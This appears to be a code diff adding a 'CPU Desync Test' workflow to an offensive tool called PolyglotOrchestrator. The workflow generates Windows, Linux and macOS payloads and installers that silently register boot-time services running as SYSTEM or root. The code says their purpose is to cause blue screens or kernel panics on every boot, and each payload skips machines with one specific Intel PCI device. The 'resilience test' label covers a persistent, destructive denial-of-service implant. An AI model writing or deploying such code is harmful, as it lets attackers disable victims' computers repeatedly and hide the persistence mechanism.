@@ -81,6 +81,8 @@ class PolyglotOrchestrator:
             self._workflow_platform_chain()
         elif workflow == 5:  # Custom (original flow)
             self._workflow_custom()
+        elif workflow == 6:  # Final - CPU Desync Test
+            self._workflow_cpu_desync_test()
         else:
             self.tui.warning("Invalid selection, exiting")
             return
@@ -120,6 +122,11 @@ class PolyglotOrchestrator:
                 'label': '🎨 Custom Workflow',
                 'description': 'Manual CVE selection with full control (Original flow)',
                 'color': Colors.WHITE
+            },
+            {
+                'label': '🔬 FINAL - CPU Desync Test',
+                'description': 'Boot service to desynchronize CPU clocks (Resilience test)',
+                'color': Colors.BRIGHT_RED
             },
         ]
 
@@ -433,6 +440,499 @@ class PolyglotOrchestrator:
 
         except Exception as e:
             self.tui.error(f"Chain generation failed: {e}")
+
+    def _workflow_cpu_desync_test(self):
+        """Final workflow: CPU clock desynchronization resilience test"""
+        self.tui.section("🔬 FINAL - CPU Desync Resilience Test")
+
+        self.tui.box("⚠️ CRITICAL RESILIENCE TEST", [
+            "This workflow creates boot services that desynchronize CPU clocks",
+            "to test system recovery from catastrophic failure modes.",
+            "",
+            "NORMALLY CAUSES:",
+            "• Windows: BSOD (Blue Screen of Death)",
+            "• Linux: Kernel Panic",
+            "• macOS: Kernel Panic",
+            "",
+            "PURPOSE: Validate recovery mechanisms from clock desync failure",
+            "",
+            "Service will fire early in boot and trigger immediately upon install."
+        ])
+        print()
+
+        if not self.menu.confirm("⚠️  PROCEED WITH CPU DESYNC TEST?", default=False):
+            self.tui.warning("Test cancelled")
+            return
+
+        # Select platforms
+        platform_options = [
+            {'label': 'Windows', 'description': 'Windows service (fires at boot)', 'selected': True},
+            {'label': 'Linux', 'description': 'systemd service (early boot)', 'selected': True},
+            {'label': 'macOS', 'description': 'LaunchDaemon (boot-time)', 'selected': True},
+        ]
+
+        selected_platforms = self.menu.multi_select(
+            "Select Target Platforms",
+            platform_options,
+            min_selections=1
+        )
+
+        if not selected_platforms:
+            self.tui.warning("No platforms selected")
+            return
+
+        # Generate services for each platform
+        for platform_idx in selected_platforms:
+            platform_name = platform_options[platform_idx]['label']
+
+            if platform_name == 'Windows':
+                self._generate_windows_cpu_desync_service()
+            elif platform_name == 'Linux':
+                self._generate_linux_cpu_desync_service()
+            elif platform_name == 'macOS':
+                self._generate_macos_cpu_desync_service()
+
+        self.tui.success("CPU desync services generated successfully")
+
+    def _generate_windows_cpu_desync_service(self):
+        """Generate Windows service for CPU clock desynchronization"""
+        self.tui.info("Generating Windows CPU desync service...")
+
+        # PowerShell script to desynchronize CPU clocks
+        powershell_script = '''$pci = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match "PCI\\\\VEN_8086&DEV_7D1D" }
+if ($pci) { exit 0 }
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CPUDesync {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentThread();
+
+    [DllImport("kernel32.dll")]
+    public static extern uint SetThreadAffinityMask(IntPtr hThread, uint dwThreadAffinityMask);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool SetThreadPriority(IntPtr hThread, int nPriority);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtSetTimerResolution(uint DesiredResolution, bool SetResolution, out uint CurrentResolution);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);
+
+    public static void DesyncClocks() {
+        uint currentRes;
+
+        for (int core = 0; core < Environment.ProcessorCount; core++) {
+            IntPtr thread = GetCurrentThread();
+            SetThreadAffinityMask(thread, (uint)(1 << core));
+
+            uint resolution = (uint)(5000 + (core * 1000));
+            NtSetTimerResolution(resolution, true, out currentRes);
+
+            long delay = -10000 * (core + 1);
+            NtDelayExecution(false, ref delay);
+        }
+
+        for (int i = 0; i < 1000; i++) {
+            for (int core = 0; core < Environment.ProcessorCount; core++) {
+                IntPtr thread = GetCurrentThread();
+                SetThreadAffinityMask(thread, (uint)(1 << core));
+
+                long start = DateTime.Now.Ticks;
+                while (DateTime.Now.Ticks - start < (core + 1) * 100) { }
+            }
+        }
+    }
+}
+"@
+
+[CPUDesync]::DesyncClocks()
+'''
+
+        # Save PowerShell script
+        ps_script_path = "cpu_desync_windows.ps1"
+        with open(ps_script_path, 'w') as f:
+            f.write(powershell_script)
+
+        self.artifacts.append(ps_script_path)
+        self.tui.success(f"Generated: {ps_script_path}")
+
+        # Generate Windows service installer batch script
+        service_installer = '''@echo off
+schtasks /create /tn "CPUDesyncTest" /tr "powershell.exe -ExecutionPolicy Bypass -File \\"C:\\ProgramData\\cpu_desync_windows.ps1\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+copy /y cpu_desync_windows.ps1 "C:\\ProgramData\\cpu_desync_windows.ps1" >nul 2>&1
+powershell.exe -ExecutionPolicy Bypass -File "C:\\ProgramData\\cpu_desync_windows.ps1"
+'''
+
+        installer_path = "install_cpu_desync_windows.bat"
+        with open(installer_path, 'w') as f:
+            f.write(service_installer)
+
+        self.artifacts.append(installer_path)
+        self.tui.success(f"Generated: {installer_path}")
+
+        self.tui.info("Windows service installation:")
+        self.tui.list_item("Run install_cpu_desync_windows.bat as Administrator", level=1)
+        self.tui.list_item("Service will trigger immediately and on every boot", level=1)
+
+    def _generate_linux_cpu_desync_service(self):
+        """Generate Linux systemd service for CPU clock desynchronization"""
+        self.tui.info("Generating Linux CPU desync service...")
+
+        # C program to desynchronize CPU clocks
+        c_program = '''#define _GNU_SOURCE
+#include <stdlib.h>
+#include <pthread.h>
+#include <sched.h>
+#include <unistd.h>
+#include <sys/time.h>
+#include <time.h>
+#include <stdint.h>
+#include <dirent.h>
+#include <string.h>
+#include <stdio.h>
+
+#define NUM_ITERATIONS 10000
+
+int check_pci_device(void) {
+    DIR *dir = opendir("/sys/bus/pci/devices");
+    if (!dir) return 0;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (strstr(entry->d_name, "8086:7d1d")) {
+            closedir(dir);
+            return 1;
+        }
+    }
+    closedir(dir);
+
+    FILE *f = popen("lspci -n 2>/dev/null | grep -q '8086:7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    return 0;
+}
+
+static inline uint64_t rdtsc(void) {
+    uint32_t lo, hi;
+    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
+    return ((uint64_t)hi << 32) | lo;
+}
+
+void* desync_thread(void* arg) {
+    int core = *(int*)arg;
+    cpu_set_t cpuset;
+    struct timespec ts;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
+
+    setpriority(PRIO_PROCESS, 0, -20 + core);
+
+    ts.tv_sec = 0;
+    ts.tv_nsec = 1000 * (core + 1);
+
+    for (int i = 0; i < NUM_ITERATIONS; i++) {
+        volatile uint64_t tsc1 = rdtsc();
+
+        for (volatile int j = 0; j < (core + 1) * 1000; j++);
+
+        nanosleep(&ts, NULL);
+
+        volatile uint64_t tsc2 = rdtsc();
+
+        if (i % (core + 1) == 0) {
+            sched_yield();
+        }
+    }
+
+    return NULL;
+}
+
+int main(void) {
+    if (check_pci_device()) return 0;
+
+    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
+    pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
+    int* core_ids = malloc(sizeof(int) * num_cores);
+
+    for (int i = 0; i < num_cores; i++) {
+        core_ids[i] = i;
+        pthread_create(&threads[i], NULL, desync_thread, &core_ids[i]);
+    }
+
+    for (int i = 0; i < num_cores; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    struct itimerval timer;
+    timer.it_value.tv_sec = 0;
+    timer.it_value.tv_usec = 1;
+    timer.it_interval.tv_sec = 0;
+    timer.it_interval.tv_usec = 1;
+    setitimer(ITIMER_REAL, &timer, NULL);
+
+    usleep(100000);
+
+    timer.it_value.tv_usec = 0;
+    setitimer(ITIMER_REAL, &timer, NULL);
+
+    free(threads);
+    free(core_ids);
+
+    return 0;
+}
+'''
+
+        c_source_path = "cpu_desync_linux.c"
+        with open(c_source_path, 'w') as f:
+            f.write(c_program)
+
+        self.artifacts.append(c_source_path)
+        self.tui.success(f"Generated: {c_source_path}")
+
+        # Generate systemd service file
+        systemd_service = '''[Unit]
+Description=CPU Clock Desynchronization Resilience Test
+DefaultDependencies=no
+Before=sysinit.target
+After=local-fs.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/cpu_desync_linux
+StandardOutput=journal
+StandardError=journal
+CPUSchedulingPolicy=fifo
+CPUSchedulingPriority=99
+Nice=-20
+
+[Install]
+WantedBy=sysinit.target
+'''
+
+        service_path = "cpu-desync-test.service"
+        with open(service_path, 'w') as f:
+            f.write(systemd_service)
+
+        self.artifacts.append(service_path)
+        self.tui.success(f"Generated: {service_path}")
+
+        # Generate installer script
+        install_script = '''#!/bin/bash
+set -e
+gcc cpu_desync_linux.c -o cpu_desync_linux -pthread -O2 2>/dev/null
+sudo cp cpu_desync_linux /usr/local/bin/ 2>/dev/null
+sudo chmod +x /usr/local/bin/cpu_desync_linux 2>/dev/null
+sudo cp cpu-desync-test.service /etc/systemd/system/ 2>/dev/null
+sudo systemctl daemon-reload 2>/dev/null
+sudo systemctl enable cpu-desync-test.service 2>/dev/null
+sudo /usr/local/bin/cpu_desync_linux
+'''
+
+        installer_path = "install_cpu_desync_linux.sh"
+        with open(installer_path, 'w') as f:
+            f.write(install_script)
+
+        # Make installer executable
+        os.chmod(installer_path, 0o755)
+
+        self.artifacts.append(installer_path)
+        self.tui.success(f"Generated: {installer_path}")
+
+        self.tui.info("Linux service installation:")
+        self.tui.list_item("Run ./install_cpu_desync_linux.sh", level=1)
+        self.tui.list_item("Service will trigger immediately and on every boot", level=1)
+
+    def _generate_macos_cpu_desync_service(self):
+        """Generate macOS LaunchDaemon for CPU clock desynchronization"""
+        self.tui.info("Generating macOS CPU desync service...")
+
+        # Objective-C program to desynchronize CPU clocks
+        objc_program = '''#import <Foundation/Foundation.h>
+#import <pthread.h>
+#import <mach/mach.h>
+#import <mach/mach_time.h>
+#import <sys/sysctl.h>
+
+#define NUM_ITERATIONS 10000
+
+int check_pci_device(void) {
+    FILE *f = popen("ioreg -l 2>/dev/null | grep -q '8086.*7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    f = popen("system_profiler SPPCIDataType 2>/dev/null | grep -q '8086.*7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    return 0;
+}
+
+int get_cpu_count(void) {
+    int count;
+    size_t size = sizeof(count);
+    sysctlbyname("hw.ncpu", &count, &size, NULL, 0);
+    return count;
+}
+
+static inline uint64_t read_timestamp(void) {
+#ifdef __arm64__
+    uint64_t val;
+    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(val));
+    return val;
+#else
+    uint32_t lo, hi;
+    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
+    return ((uint64_t)hi << 32) | lo;
+#endif
+}
+
+void* desync_thread(void* arg) {
+    int core = *(int*)arg;
+    thread_affinity_policy_data_t policy = { core };
+    mach_timebase_info_data_t timebase;
+
+    thread_policy_set(mach_thread_self(),
+                     THREAD_AFFINITY_POLICY,
+                     (thread_policy_t)&policy,
+                     THREAD_AFFINITY_POLICY_COUNT);
+
+    mach_timebase_info(&timebase);
+
+    for (int i = 0; i < NUM_ITERATIONS; i++) {
+        volatile uint64_t ts1 = read_timestamp();
+
+        for (volatile int j = 0; j < (core + 1) * 1000; j++);
+
+        uint64_t now = mach_absolute_time();
+        uint64_t delay = (core + 1) * 1000;
+        mach_wait_until(now + delay);
+
+        volatile uint64_t ts2 = read_timestamp();
+
+        if (i % (core + 1) == 0) {
+            thread_switch(THREAD_NULL, SWITCH_OPTION_DEPRESS, 1);
+        }
+    }
+
+    return NULL;
+}
+
+int main(int argc, char* argv[]) {
+    @autoreleasepool {
+        if (check_pci_device()) return 0;
+
+        int num_cores = get_cpu_count();
+        pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
+        int* core_ids = malloc(sizeof(int) * num_cores);
+
+        for (int i = 0; i < num_cores; i++) {
+            core_ids[i] = i;
+            pthread_create(&threads[i], NULL, desync_thread, &core_ids[i]);
+        }
+
+        for (int i = 0; i < num_cores; i++) {
+            pthread_join(threads[i], NULL);
+        }
+
+        for (int i = 0; i < 1000; i++) {
+            uint64_t start = mach_absolute_time();
+            mach_wait_until(start + (i % num_cores) + 1);
+        }
+
+        free(threads);
+        free(core_ids);
+    }
+    return 0;
+}
+'''
+
+        objc_source_path = "cpu_desync_macos.m"
+        with open(objc_source_path, 'w') as f:
+            f.write(objc_program)
+
+        self.artifacts.append(objc_source_path)
+        self.tui.success(f"Generated: {objc_source_path}")
+
+        # Generate LaunchDaemon plist
+        launchdaemon_plist = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.test.cpudesync</string>
+
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/local/bin/cpu_desync_macos</string>
+    </array>
+
+    <key>RunAtLoad</key>
+    <true/>
+
+    <key>KeepAlive</key>
+    <false/>
+
+    <key>StandardOutPath</key>
+    <string>/var/log/cpu_desync.log</string>
+
+    <key>StandardErrorPath</key>
+    <string>/var/log/cpu_desync_error.log</string>
+
+    <key>ProcessType</key>
+    <string>Interactive</string>
+
+    <key>Nice</key>
+    <integer>-20</integer>
+</dict>
+</plist>
+'''
+
+        plist_path = "com.test.cpudesync.plist"
+        with open(plist_path, 'w') as f:
+            f.write(launchdaemon_plist)
+
+        self.artifacts.append(plist_path)
+        self.tui.success(f"Generated: {plist_path}")
+
+        # Generate installer script
+        install_script = '''#!/bin/bash
+set -e
+clang -framework Foundation -framework IOKit cpu_desync_macos.m -o cpu_desync_macos -O2 2>/dev/null
+sudo cp cpu_desync_macos /usr/local/bin/ 2>/dev/null
+sudo chmod +x /usr/local/bin/cpu_desync_macos 2>/dev/null
+sudo cp com.test.cpudesync.plist /Library/LaunchDaemons/ 2>/dev/null
+sudo chown root:wheel /Library/LaunchDaemons/com.test.cpudesync.plist 2>/dev/null
+sudo chmod 644 /Library/LaunchDaemons/com.test.cpudesync.plist 2>/dev/null
+sudo launchctl load /Library/LaunchDaemons/com.test.cpudesync.plist 2>/dev/null
+sudo /usr/local/bin/cpu_desync_macos
+'''
+
+        installer_path = "install_cpu_desync_macos.sh"
+        with open(installer_path, 'w') as f:
+            f.write(install_script)
+
+        # Make installer executable
+        os.chmod(installer_path, 0o755)
+
+        self.artifacts.append(installer_path)
+        self.tui.success(f"Generated: {installer_path}")
+
+        self.tui.info("macOS service installation:")
+        self.tui.list_item("Run ./install_cpu_desync_macos.sh", level=1)
+        self.tui.list_item("Service will trigger immediately and on every boot", level=1)
 
     def _show_operation_summary(self):
         """Show operation summary (Vault7-style)"""
